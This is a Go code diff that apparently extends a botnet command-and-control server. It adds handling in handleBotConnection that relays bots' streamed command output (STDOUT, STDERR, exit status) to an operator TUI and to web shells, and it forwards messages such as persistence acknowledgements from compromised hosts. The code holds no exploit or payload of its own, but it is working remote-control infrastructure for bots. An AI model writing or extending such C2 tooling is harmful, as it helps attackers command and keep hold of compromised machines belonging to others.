@@ -659,6 +659,51 @@ func handleBotConnection(conn net.Conn) {
 			continue
 		}
 
+		// Streaming protocol lines from !stream / machete() — forward to web shells
+		// with typed messages; skip commandOrigin routing to avoid clearing it mid-stream.
+		if strings.HasPrefix(line, "STDOUT: ") {
+			text := strings.TrimPrefix(line, "STDOUT: ")
+			if tuiMode && tuiProgram != nil {
+				tuiProgram.Send(ShellOutputMsg{BotID: botID, Output: text + "\n"})
+			}
+			sendWebShellStreamMsg(botID, map[string]interface{}{
+				"type": "stream_stdout", "botID": botID, "output": text + "\n",
+			})
+			continue
+		}
+		if strings.HasPrefix(line, "STDERR: ") {
+			text := strings.TrimPrefix(line, "STDERR: ")
+			if tuiMode && tuiProgram != nil {
+				tuiProgram.Send(ShellOutputMsg{BotID: botID, Output: text + "\n"})
+			}
+			sendWebShellStreamMsg(botID, map[string]interface{}{
+				"type": "stream_stderr", "botID": botID, "output": text + "\n",
+			})
+			continue
+		}
+		if line == "EXIT: Command completed successfully" {
+			sendWebShellStreamMsg(botID, map[string]interface{}{
+				"type": "stream_done", "botID": botID, "exitCode": 0,
+			})
+			continue
+		}
+		if strings.HasPrefix(line, "EXIT ERROR: ") {
+			errMsg := strings.TrimPrefix(line, "EXIT ERROR: ")
+			if tuiMode && tuiProgram != nil {
+				tuiProgram.Send(ShellOutputMsg{BotID: botID, Output: "[" + errMsg + "]\n"})
+			}
+			sendWebShellStreamMsg(botID, map[string]interface{}{
+				"type": "stream_done", "botID": botID, "exitCode": 1, "error": errMsg,
+			})
+			continue
+		}
+		if line == "Streaming started" {
+			sendWebShellStreamMsg(botID, map[string]interface{}{
+				"type": "stream_start", "botID": botID,
+			})
+			continue
+		}
+
 		// Handle other bot messages
 		logMsg("[BOT-%s] %s", botID, line)
 
@@ -676,6 +721,9 @@ func handleBotConnection(conn net.Conn) {
 			delete(commandOrigin, botID)
 			originLock.Unlock()
 		}
+
+		// Forward non-streaming output to web shells (INFO:, persist ack, etc.)
+		forwardBotOutputToWebShells(botID, line)
 	}
 }
 
